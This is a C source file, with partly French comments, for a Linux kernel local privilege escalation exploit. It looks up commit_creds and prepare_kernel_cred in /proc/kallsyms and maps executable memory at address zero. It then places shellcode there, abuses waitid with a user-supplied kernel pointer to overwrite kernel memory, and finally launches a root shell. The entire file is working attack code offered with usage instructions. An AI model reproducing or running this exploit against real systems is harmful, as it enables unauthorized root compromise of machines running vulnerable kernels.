#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>

struct cred;
struct task_struct;
 
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
 
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
void get_shell() {
  char *argv[] = {"/bin/sh", NULL};
 
  if (getuid() == 0){
    printf("[+] Root shell success !! :)\n");
    execve("/bin/sh", argv, NULL);
  }
  printf("[-] failed to get root shell :(\n");
}
 
void get_root() {
  if (commit_creds && prepare_kernel_cred)
    commit_creds(prepare_kernel_cred(0));
}
 
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;
 
  f = fopen("/proc/kallsyms", "r");
  if (f == NULL) {
    printf("[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

int main(int ac, char **av)
{
	if (ac != 2) {
		printf("./exploit kernel_offset\n");
		printf("exemple = 0xffffffff81f3f45a");
		return EXIT_FAILURE;
	}

	// 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions
	prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
	commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
	// have_canfork_callback offset <= rendre dynamique aussi
	
	pid_t     pid;
	/* siginfo_t info; */

	// 1 - Mapper la mmoire  l'adresse 0x0000000000000000
	printf("[+] Try to allocat 0x00000000...\n");
	if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
		printf("[-] Failed to allocat 0x00000000\n");
		return -1;
	}
	printf("[+] Allocation success !\n");
	/* memset(0, 0xcc, 4096); */
/*
movq rax, 0xffffffff81f3f45a
movq [rax], 0
mov rax, 0x4242424242424242
call rax
xor rax, rax
ret
replace 0x4242424242424242 by get_root
https://defuse.ca/online-x86-assembler.htm#disassembly
	 */
	unsigned char shellcode[] = 
	{ 0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };
	void **get_root_offset = rawmemchr(shellcode, 0x42);
	(*get_root_offset) = get_root;

	memcpy(0, shellcode, sizeof(shellcode));
	/* strcpy(0, "\x48\x31\xC0\xC3"); // xor rax, rax; ret */

	if(-1 == (pid = fork())) {
		perror("fork()");
		return EXIT_FAILURE;
	}

	if(pid == 0) {
		_exit(0xDEADBEEF);
		perror("son");
		return EXIT_FAILURE;
	}

	siginfo_t *ptr = (siginfo_t*)strtoul(av[1], (char**)0, 0);
	waitid(P_PID, pid, ptr, WEXITED | WSTOPPED | WCONTINUED);

// TRIGGER
	pid = fork();
	printf("fork_ret = %d\n", pid);	
	if (pid > 0)
		get_shell();
	return EXIT_SUCCESS;
}